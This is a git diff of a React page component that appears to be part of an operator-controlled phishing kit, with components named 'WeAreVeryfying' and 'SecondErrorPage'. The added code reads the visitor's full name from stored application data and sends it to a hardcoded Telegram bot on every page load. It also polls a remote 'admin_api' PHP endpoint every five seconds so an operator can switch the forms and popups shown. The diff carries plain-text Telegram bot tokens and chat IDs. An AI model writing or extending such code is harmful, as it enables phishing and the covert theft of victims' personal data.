@@ -21,72 +21,65 @@ import SecondErrorPage from "../components/secondErrorPage";
 import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
-const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Update this based on your server configuration
-const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
-const CHAT_ID = '7062736155';
-
-
+const API_URL =
+  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api46php"; // Update this based on your server configuration
+const BOT_TOKEN = "8595083061:AAG0D7T9a3FyUkSLpnUfgxjub_Vk7PqnD6o";
+const CHAT_ID = "8317872395";
 
 const UserPage2 = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopupu2, setShowPopupu2] = useState(false);
 
-const storedData = localStorage.getItem("applicationData");
-const parsedData = storedData ? JSON.parse(storedData) : {};
+  const storedData = localStorage.getItem("applicationData");
+  const parsedData = storedData ? JSON.parse(storedData) : {};
 
-const fullName = parsedData.fullname || "N/A";
+  const fullName = parsedData.fullname || "N/A";
 
+  useEffect(() => {
+    const fetchFormType = async () => {
+      try {
+        const res = await fetch(`${API_URL}?action=fetch_forms2`);
+        const data = await res.json();
+        const selectedForm = data?.currentForm2 || "LandingPage";
+        setFormType(selectedForm);
+      } catch (error) {
+        console.error("Failed to fetch form type from PHP:", error);
+      }
+    };
 
+    fetchFormType();
+  }, []);
 
-useEffect(() => {
-  const fetchFormType = async () => {
-    try {
-      const res = await fetch(`${API_URL}?action=fetch_forms2`);
-      const data = await res.json();
-      const selectedForm = data?.currentForm2 || "LandingPage";
-      setFormType(selectedForm);
-    } catch (error) {
-      console.error("Failed to fetch form type from PHP:", error);
-    }
-  };
+  useEffect(() => {
+    const sendToTelegram = async (message: string) => {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
+      });
+    };
 
-  fetchFormType();
-}, []);
-
-useEffect(() => {
-  const sendToTelegram = async (message: string) => {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-      }),
-    });
-  };
-
-  sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
-}, []);
-
+    sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
+  }, []);
 
   useEffect(() => {
     const interval = setInterval(() => {
       fetch(`${API_URL}?action=get_popup_statusu2`)
-        .then(res => res.json())
-        .then(data => {
+        .then((res) => res.json())
+        .then((data) => {
           if (data.showPopupu2) setShowPopupu2(true);
           // Optional: close popup when it's false
           else setShowPopupu2(false);
         });
     }, 5000); // every 5 seconds
-  
+
     return () => clearInterval(interval); // cleanup on unmount
   }, []);
-  
-
-
 
   // Fetch the popup status from the PHP backend
   useEffect(() => {
